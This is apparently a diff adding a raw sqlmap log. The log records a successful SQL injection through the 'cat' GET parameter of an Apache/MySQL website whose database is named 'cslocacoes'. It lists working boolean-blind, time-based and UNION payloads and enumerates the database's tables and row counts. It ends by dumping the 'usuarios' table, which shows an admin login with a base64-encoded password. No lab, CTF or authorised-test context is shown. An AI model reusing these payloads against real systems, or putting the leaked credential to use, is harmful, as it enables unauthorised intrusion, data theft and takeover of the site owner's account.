@@ -1,0 +1,125 @@
+sqlmap identified the following injection point(s) with a total of 71 HTTP(s) requests:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=4 AND 5368=5368
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cat=4 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: cat=4 UNION ALL SELECT 56,CONCAT(0x7171627071,0x516542774a55615879755477526a4b4c4b7662766f4644794e4f6c664a767a6878766667684d706e,0x7170786b71),56,56,56-- Mkpp
+    Vector:  UNION ALL SELECT 56,[QUERY],56,56,56[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] cslocacoes
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=4 AND 5368=5368
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cat=4 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: cat=4 UNION ALL SELECT 56,CONCAT(0x7171627071,0x516542774a55615879755477526a4b4c4b7662766f4644794e4f6c664a767a6878766667684d706e,0x7170786b71),56,56,56-- Mkpp
+    Vector:  UNION ALL SELECT 56,[QUERY],56,56,56[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: cslocacoes
+[6 tables]
++---------------+
+| categorias    |
+| produtos      |
+| produtosfotos |
+| usuarios      |
+| vendas        |
+| vendasfotos   |
++---------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=4 AND 5368=5368
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cat=4 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: cat=4 UNION ALL SELECT 56,CONCAT(0x7171627071,0x516542774a55615879755477526a4b4c4b7662766f4644794e4f6c664a767a6878766667684d706e,0x7170786b71),56,56,56-- Mkpp
+    Vector:  UNION ALL SELECT 56,[QUERY],56,56,56[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: cslocacoes
+[6 tables]
++---------------+
+| categorias    |
+| produtos      |
+| produtosfotos |
+| usuarios      |
+| vendas        |
+| vendasfotos   |
++---------------+
+
+Database: cslocacoes
++---------------+---------+
+| Table         | Entries |
++---------------+---------+
+| produtos      | 85      |
+| produtosfotos | 77      |
+| categorias    | 15      |
+| usuarios      | 1       |
++---------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=4 AND 5368=5368
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cat=4 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: cat=4 UNION ALL SELECT 56,CONCAT(0x7171627071,0x516542774a55615879755477526a4b4c4b7662766f4644794e4f6c664a767a6878766667684d706e,0x7170786b71),56,56,56-- Mkpp
+    Vector:  UNION ALL SELECT 56,[QUERY],56,56,56[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: cslocacoes
+Table: usuarios
+[1 entry]
++----+-------+------------------+
+| id | login | senha            |
++----+-------+------------------+
+| 1  | admin | c2NoaXJtZXIxNw== |
++----+-------+------------------+
+
